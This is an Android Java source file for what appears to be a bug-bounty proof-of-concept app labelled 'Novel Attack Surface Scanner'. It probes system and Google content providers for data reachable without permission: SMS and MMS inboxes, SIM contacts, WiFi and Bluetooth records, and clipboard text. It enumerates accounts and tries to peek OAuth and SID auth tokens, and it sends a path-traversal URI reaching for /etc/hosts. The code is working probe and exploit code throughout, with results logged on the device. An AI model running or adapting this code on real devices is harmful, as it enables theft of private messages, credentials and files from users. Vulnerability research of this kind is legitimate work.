package com.vrp.poc;

import android.app.Activity;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ProviderInfo;
import android.content.pm.ResolveInfo;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.widget.TextView;

import java.util.List;

public class NovelSurfaceScanActivity extends Activity {
    private static final String TAG = "NovelSurface";
    private TextView logView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20, 20, 20, 20);
        logView = new TextView(this);
        logView.setTextSize(6);
        logView.setText("Novel Attack Surface Scanner\n");
        logView.append("UID: " + android.os.Process.myUid() + "\n\n");
        ll.addView(logView);
        sv.addView(ll);
        setContentView(sv);
        new Thread(this::runTests).start();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> logView.append(msg + "\n"));
    }

    private void runTests() {
        scanSliceProviders();
        scanDocumentsProviders();
        testClipboardProvider();
        testPrintSpoolerProvider();
        testTelephonyProviders();
        testWifiProviders();
        testBluetoothProviders();
        testMediaSessionLeak();
        testAccountManagerLeak();
        testSystemFileProviders();
        log("\n=== ALL NOVEL SURFACE SCANS COMPLETE ===");
    }

    private void scanSliceProviders() {
        log("=== SCAN 1: SliceProvider Attack Surface ===\n");

        String[] sliceUris = {
            "content://com.android.settings/slice",
            "content://com.android.settings.slices/slice",
            "content://com.google.android.gms.nearby.sharing/slice",
            "content://com.google.android.gms/slice",
            "content://com.android.systemui.slices/slice",
            "content://com.google.android.apps.wellbeing/slice",
            "content://com.google.android.dialer/slice",
            "content://com.google.android.deskclock/slice",
            "content://android.settings.slices/slice",
        };

        for (String uri : sliceUris) {
            try {
                Cursor c = getContentResolver().query(Uri.parse(uri), null, null, null, null);
                if (c != null) {
                    log("[ACCESSIBLE] " + uri + " rows=" + c.getCount() + " cols=" + c.getColumnCount());
                    if (c.getColumnCount() > 0) {
                        StringBuilder cols = new StringBuilder();
                        for (String col : c.getColumnNames()) cols.append(col).append(",");
                        log("  columns: " + cols);
                    }
                    if (c.moveToFirst()) {
                        for (int i = 0; i < Math.min(c.getColumnCount(), 5); i++) {
                            try {
                                String val = c.getString(i);
                                if (val != null) log("  " + c.getColumnName(i) + ": " + shorten(val, 80));
                            } catch (Exception e) {}
                        }
                    }
                    c.close();
                }
            } catch (SecurityException e) {
                log("[BLOCKED] " + uri + ": " + shorten(e.getMessage(), 60));
            } catch (Exception e) {
                log("[ERROR] " + uri + ": " + e.getClass().getSimpleName());
            }
        }

        // Try Slice binding
        String[] sliceActions = {
            "content://com.android.settings.slices/action/wifi",
            "content://com.android.settings.slices/action/bluetooth",
            "content://com.android.settings.slices/action/airplane",
            "content://com.android.settings.slices/action/flashlight",
            "content://com.android.settings.slices/action/location",
            "content://com.android.settings.slices/action/battery_saver",
            "content://com.android.settings.slices/action/nfc",
            "content://com.android.settings.slices/action/hotspot",
            "content://com.android.settings.slices/action/mobile_data",
        };

        for (String uri : sliceActions) {
            try {
                Cursor c = getContentResolver().query(Uri.parse(uri), null, null, null, null);
                if (c != null) {
                    log("[SLICE-ACTION] " + uri.substring(uri.lastIndexOf("/") + 1) + " rows=" + c.getCount());
                    c.close();
                }
            } catch (SecurityException e) {
                log("[BLOCKED] " + uri.substring(uri.lastIndexOf("/") + 1) + ": perm");
            } catch (Exception e) {
                log("[ERROR] " + uri.substring(uri.lastIndexOf("/") + 1) + ": " + e.getClass().getSimpleName());
            }
        }
    }

    private void scanDocumentsProviders() {
        log("\n=== SCAN 2: DocumentsProvider Exposure ===\n");

        String[] docUris = {
            "content://com.android.externalstorage.documents/root",
            "content://com.android.providers.downloads.documents/root",
            "content://com.android.providers.media.documents/root",
            "content://com.google.android.apps.docs.storage/root",
            "content://com.google.android.apps.docs.storagebackend/root",
            "content://com.android.mtp.documents/root",
            "content://com.android.shell.documents/root",
        };

        for (String uri : docUris) {
            try {
                Cursor c = getContentResolver().query(Uri.parse(uri), null, null, null, null);
                if (c != null) {
                    log("[DOC-ROOT] " + uri.split("/")[2] + " rows=" + c.getCount());
                    if (c.moveToFirst()) {
                        for (String col : c.getColumnNames()) {
                            try {
                                String val = c.getString(c.getColumnIndex(col));
                                if (val != null) log("  " + col + ": " + shorten(val, 60));
                            } catch (Exception e) {}
                        }
                    }
                    c.close();
                }
            } catch (SecurityException e) {
                log("[BLOCKED] " + uri.split("/")[2] + ": " + shorten(e.getMessage(), 50));
            } catch (Exception e) {
                log("[ERROR] " + uri.split("/")[2] + ": " + e.getClass().getSimpleName());
            }
        }
    }

    private void testClipboardProvider() {
        log("\n=== SCAN 3: Clipboard/Content Provider ===\n");

        // Test clipboard access via ContentResolver
        String[] clipUris = {
            "content://clipboard/clip",
            "content://com.android.clipboard/clip",
            "content://com.android.internal.clipboard/clip",
        };

        for (String uri : clipUris) {
            try {
                Cursor c = getContentResolver().query(Uri.parse(uri), null, null, null, null);
                if (c != null) {
                    log("[CLIP] " + uri + " accessible! rows=" + c.getCount());
                    c.close();
                }
            } catch (Exception e) {
                log("[N/A] " + uri + ": " + e.getClass().getSimpleName());
            }
        }

        // Try reading clipboard via ClipboardManager
        try {
            android.content.ClipboardManager cm = (android.content.ClipboardManager)
                getSystemService(CLIPBOARD_SERVICE);
            if (cm.hasPrimaryClip()) {
                android.content.ClipData clip = cm.getPrimaryClip();
                if (clip != null && clip.getItemCount() > 0) {
                    CharSequence text = clip.getItemAt(0).getText();
                    log("[CLIP-API] Clipboard text: " + shorten(text != null ? text.toString() : "null", 60));
                }
            } else {
                log("[CLIP-API] No clipboard content");
            }
        } catch (Exception e) {
            log("[CLIP-API] " + e.getClass().getSimpleName() + ": " + shorten(e.getMessage(), 60));
        }
    }

    private void testPrintSpoolerProvider() {
        log("\n=== SCAN 4: Print Spooler Provider ===\n");

        String[] printUris = {
            "content://com.android.printspooler/print_jobs",
            "content://com.android.printspooler/printers",
        };

        for (String uri : printUris) {
            try {
                Cursor c = getContentResolver().query(Uri.parse(uri), null, null, null, null);
                if (c != null) {
                    log("[PRINT] " + uri + " accessible! rows=" + c.getCount());
                    c.close();
                }
            } catch (Exception e) {
                log("[N/A] print: " + e.getClass().getSimpleName());
            }
        }
    }

    private void testTelephonyProviders() {
        log("\n=== SCAN 5: Telephony Providers (zero-perm test) ===\n");

        // Test various telephony URIs that might leak data without proper permission
        String[][] telUris = {
            {"content://telephony/carriers", "APN configs"},
            {"content://telephony/carriers/preferapn", "preferred APN"},
            {"content://telephony/siminfo", "SIM info"},
            {"content://telephony/cellbroadcasts", "cell broadcasts"},
            {"content://carrier_information/carrier_id", "carrier ID"},
            {"content://telephony/emergency_number", "emergency numbers"},
            {"content://icc/adn", "SIM contacts (ADN)"},
            {"content://icc/fdn", "SIM fixed dialing"},
            {"content://icc/sdn", "SIM service dialing"},
        };

        for (String[] pair : telUris) {
            try {
                Cursor c = getContentResolver().query(Uri.parse(pair[0]), null, null, null, null);
                if (c != null) {
                    log("[TEL] " + pair[1] + " ACCESSIBLE! rows=" + c.getCount() + " cols=" + c.getColumnCount());
                    if (c.getCount() > 0 && c.moveToFirst()) {
                        StringBuilder cols = new StringBuilder();
                        for (String col : c.getColumnNames()) cols.append(col).append(",");
                        log("  columns: " + cols);
                        // Extract first row sample
                        for (int i = 0; i < Math.min(c.getColumnCount(), 8); i++) {
                            try {
                                String val = c.getString(i);
                                if (val != null && !val.isEmpty())
                                    log("  " + c.getColumnName(i) + "=" + shorten(val, 50));
                            } catch (Exception e) {}
                        }
                    }
                    c.close();
                }
            } catch (SecurityException e) {
                log("[BLOCKED] " + pair[1] + ": perm denied");
            } catch (Exception e) {
                log("[N/A] " + pair[1] + ": " + e.getClass().getSimpleName());
            }
        }

        // Test MMS/SMS providers without READ_SMS
        String[][] smsUris = {
            {"content://mms-sms/conversations", "SMS conversations"},
            {"content://sms/inbox", "SMS inbox"},
            {"content://mms/inbox", "MMS inbox"},
            {"content://sms/draft", "SMS drafts"},
        };

        for (String[] pair : smsUris) {
            try {
                Cursor c = getContentResolver().query(Uri.parse(pair[0]), null, null, null, null);
                if (c != null) {
                    log("[SMS-NOPERM] " + pair[1] + " ACCESSIBLE! rows=" + c.getCount());
                    c.close();
                }
            } catch (SecurityException e) {
                log("[BLOCKED] " + pair[1]);
            } catch (Exception e) {
                log("[N/A] " + pair[1] + ": " + e.getClass().getSimpleName());
            }
        }
    }

    private void testWifiProviders() {
        log("\n=== SCAN 6: WiFi/Network Providers ===\n");

        String[][] wifiUris = {
            {"content://wifi/configured_networks", "WiFi saved networks"},
            {"content://com.android.wifi/configured_networks", "WiFi config"},
            {"content://wifi/passpoint/configs", "Passpoint configs"},
            {"content://com.android.networkstack/network_scores", "network scores"},
        };

        for (String[] pair : wifiUris) {
            try {
                Cursor c = getContentResolver().query(Uri.parse(pair[0]), null, null, null, null);
                if (c != null) {
                    log("[WIFI] " + pair[1] + " ACCESSIBLE! rows=" + c.getCount());
                    c.close();
                }
            } catch (Exception e) {
                log("[N/A] " + pair[1] + ": " + e.getClass().getSimpleName());
            }
        }
    }

    private void testBluetoothProviders() {
        log("\n=== SCAN 7: Bluetooth Providers ===\n");

        String[][] btUris = {
            {"content://com.android.bluetooth.opp/btopp", "BT OPP transfers"},
            {"content://com.android.bluetooth.opp/live_folder/transfer", "BT transfers live"},
            {"content://com.android.bluetooth.map/message", "BT MAP messages"},
            {"content://com.android.bluetooth.pbap/contacts", "BT PBAP contacts"},
        };

        for (String[] pair : btUris) {
            try {
                Cursor c = getContentResolver().query(Uri.parse(pair[0]), null, null, null, null);
                if (c != null) {
                    log("[BT] " + pair[1] + " ACCESSIBLE! rows=" + c.getCount());
                    if (c.moveToFirst()) {
                        StringBuilder cols = new StringBuilder();
                        for (String col : c.getColumnNames()) cols.append(col).append(",");
                        log("  columns: " + cols);
                    }
                    c.close();
                }
            } catch (SecurityException e) {
                log("[BLOCKED] " + pair[1]);
            } catch (Exception e) {
                log("[N/A] " + pair[1] + ": " + e.getClass().getSimpleName());
            }
        }
    }

    private void testMediaSessionLeak() {
        log("\n=== SCAN 8: MediaSession/Notification Leak ===\n");

        try {
            android.media.session.MediaSessionManager msm =
                (android.media.session.MediaSessionManager) getSystemService("media_session");
            if (msm != null) {
                try {
                    List<?> sessions = msm.getActiveSessions(null);
                    log("[MEDIA] Active sessions: " + sessions.size());
                    for (Object s : sessions) {
                        android.media.session.MediaController mc = (android.media.session.MediaController) s;
                        log("  session: " + mc.getPackageName());
                        android.media.MediaMetadata meta = mc.getMetadata();
                        if (meta != null) {
                            String title = meta.getString(android.media.MediaMetadata.METADATA_KEY_TITLE);
                            String artist = meta.getString(android.media.MediaMetadata.METADATA_KEY_ARTIST);
                            log("  title=" + title + " artist=" + artist);
                        }
                    }
                } catch (SecurityException e) {
                    log("[BLOCKED] getActiveSessions: needs MEDIA_CONTENT_CONTROL or notification listener");
                }
            }
        } catch (Exception e) {
            log("[N/A] MediaSession: " + e.getClass().getSimpleName());
        }
    }

    private void testAccountManagerLeak() {
        log("\n=== SCAN 9: AccountManager Enumeration ===\n");

        try {
            android.accounts.AccountManager am = android.accounts.AccountManager.get(this);
            android.accounts.Account[] accounts = am.getAccounts();
            log("[ACCOUNTS] Visible accounts: " + accounts.length);
            for (android.accounts.Account a : accounts) {
                log("  " + a.type + ": " + a.name);
            }

            // Try to get auth tokens
            for (android.accounts.Account a : accounts) {
                try {
                    String token = am.peekAuthToken(a, "oauth2:https://www.googleapis.com/auth/userinfo.email");
                    if (token != null) {
                        log("[VULN] Auth token for " + a.name + ": " + shorten(token, 20) + "...");
                    }
                } catch (Exception e) {}

                try {
                    String token = am.peekAuthToken(a, "SID");
                    if (token != null) {
                        log("[VULN] SID token for " + a.name + ": " + shorten(token, 20) + "...");
                    }
                } catch (Exception e) {}
            }

            // Get authenticator types
            android.accounts.AuthenticatorDescription[] auths = am.getAuthenticatorTypes();
            log("[ACCOUNTS] Authenticator types: " + auths.length);
            for (android.accounts.AuthenticatorDescription ad : auths) {
                log("  auth: " + ad.type + " pkg=" + ad.packageName);
            }
        } catch (SecurityException e) {
            log("[BLOCKED] AccountManager: " + shorten(e.getMessage(), 60));
        } catch (Exception e) {
            log("[ERROR] AccountManager: " + e.getClass().getSimpleName());
        }
    }

    private void testSystemFileProviders() {
        log("\n=== SCAN 10: System FileProvider Path Traversal ===\n");

        // Test FileProviders from system apps for path traversal
        String[][] fileProviders = {
            {"content://com.google.android.gms.fileprovider", "GMS FileProvider"},
            {"content://com.google.android.apps.docs.files/files", "Drive files"},
            {"content://com.android.providers.media.photopicker/media", "Photo picker"},
            {"content://com.google.android.apps.photos.contentprovider", "Photos provider"},
            {"content://com.android.chrome.FileProvider", "Chrome FileProvider"},
            {"content://com.android.providers.downloads/public_downloads", "Public downloads"},
            {"content://com.android.providers.downloads/all_downloads", "All downloads"},
            {"content://com.android.providers.downloads/my_downloads", "My downloads"},
        };

        for (String[] pair : fileProviders) {
            try {
                Cursor c = getContentResolver().query(Uri.parse(pair[0]), null, null, null, null);
                if (c != null) {
                    log("[FILE] " + pair[1] + " ACCESSIBLE! rows=" + c.getCount());
                    if (c.moveToFirst() && c.getColumnCount() > 0) {
                        StringBuilder cols = new StringBuilder();
                        for (String col : c.getColumnNames()) cols.append(col).append(",");
                        log("  columns: " + cols);
                    }
                    c.close();
                }
            } catch (SecurityException e) {
                log("[BLOCKED] " + pair[1] + ": perm denied");
            } catch (Exception e) {
                log("[N/A] " + pair[1] + ": " + e.getClass().getSimpleName());
            }
        }

        // Test path traversal on accessible providers
        String[] traversalPayloads = {
            "content://com.android.providers.downloads/all_downloads/1",
            "content://com.android.providers.downloads/all_downloads/../../../etc/hosts",
            "content://com.android.providers.media.documents/document/image%3A1",
        };

        for (String uri : traversalPayloads) {
            try {
                java.io.InputStream is = getContentResolver().openInputStream(Uri.parse(uri));
                if (is != null) {
                    byte[] buf = new byte[256];
                    int read = is.read(buf);
                    is.close();
                    if (read > 0) {
                        log("[FILE-READ] " + shorten(uri, 60) + " read " + read + " bytes");
                        log("  preview: " + shorten(new String(buf, 0, Math.min(read, 100)), 100));
                    }
                }
            } catch (SecurityException e) {
                log("[BLOCKED] traversal: perm");
            } catch (java.io.FileNotFoundException e) {
                // Expected
            } catch (Exception e) {
                log("[N/A] traversal: " + e.getClass().getSimpleName());
            }
        }
    }

    private String shorten(String s, int max) {
        if (s == null) return "null";
        return s.length() > max ? s.substring(0, max) + "..." : s;
    }
}
